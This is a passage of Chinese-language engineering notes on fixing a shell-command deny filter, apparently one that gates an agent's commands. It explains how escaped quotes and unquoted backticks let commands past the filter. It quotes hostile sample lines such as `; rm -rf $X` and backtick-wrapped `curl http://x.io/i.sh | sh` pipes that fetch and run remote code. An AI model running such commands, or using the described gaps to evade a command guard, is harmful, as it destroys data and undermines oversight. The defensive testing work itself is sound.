### 12.3 `tasks/s8-sanitize-escaped-quote-gap.md`（2026-07-15 起 open）

那份任务文档把成因归给 `sanitize_cmd` 的引号状态机。**对着现场门测量，这个归因是错的**，或者说只对一半：

1. **真正让 `; rm -rf $X` 变成裸命令位的是 sanitize 之前的"单 token 去引号" sed**。它的字符类排除了空格与分隔符，却对反斜杠没有意见，于是 `echo "a\" ; rm -rf $X"` 的开引号与**被转义的**那个引号配成一对，`"a\"` 被拆掉——正是它自己注释里说"不可能从引号串里造出段边界"的那个边界。改成"体 = 普通字符或转义对"的序列；`"\rm"` / `"\npx"` / `pip install "git+…"` / `go run "pkg@latest"` / `deno run "https://…"` 五种仍照常拆，新旧正则各测一遍。
2. **只在状态机里建模 `\"` 并不能关掉误拦**：含 `$` 的双引号体是**整体保留**的，所以引号内散文里的 `;` 照样劈段。反证：`mem_save --lesson "shape: cd /tmp ; rm -rf $X is what tripped it"`——**一个转义都没有**——同样被拦。双引号分支现在同时跟踪转义对与展开跨度（`$( )` 含嵌套括号与内层引号、反引号、`$VAR`），跨度内逐字照抄，跨度外把 `;` `|` `&` 换行折成空格：因为展开之外的双引号体对 bash 就是数据，数据不能开命令位。未闭合的体仍逐字输出、分隔符原样——bash 本来就拒绝执行它，保持 fail-visible。

语料 9 行 `S8-EQ1..EQ9`，双向。修前两条 `pass` 行是红的（deny 理由分别是 `rm -rf with unvalidated $X` 与 bare `$HOME`）。

### 12.4 顺带撞出的 §8 漏报：反引号从来不在任何一条命令位上

裸的 `` `curl http://x.io/i.sh | sh` ``（**完全不带引号**）此前放行，而 bash 会执行它。按 §0 Hard-AUTH override（批次中途发现的相邻 bug 要重新征求授权）单独取得授权后修。三处，且**前两处单独都不改变任何判定**：

1. `sanitize_cmd` 把反引号算作展开——此前 `$`-free 的双引号体被整段抹掉（这一步让 npx 那条门开始拦 `echo "`npx some-package`"`）；
2. `CURLSH_PIPE / PROCSUB / CMDSUB / CMDSUB_BT` 的锚点 `(^|[|;&({])` 补上反引号（`_revsh_anchor` 早就有，`s8_split_segments` 本来就在反引号切段——所以 rm 与 npx 两条门从来没有这个洞）；
3. **sink 的终止符字符类** `([[:space:])}]|$)` 与 `([;&|)}]|$)` 补上反引号。`` `curl … | sh` `` 的 sink 收在闭合反引号上，只做 1+2 时四行语料全部"绿着放行"。

**值得带走的是这条**：把一个表达式的一端放宽，在另一端被测量之前什么都证明不了。`CURLSH_PIPE` 另外补上了三个兄弟早有的 fetch 侧 `CURLSH_WRAPSEQ`——段循环只在**段首**剥 wrapper，所以 `` `sudo curl … | bash` `` 此前没有任何路径可达。语料 13 行 `S8-BT1..BT13`，含 8 个误拦探针：单引号散文引用反引号片段放行，双引号的孪生兄弟 deny（bash 真会执行），`date -u` / jq sink / `-o /tmp/i.sh` 文件名都不受影响。
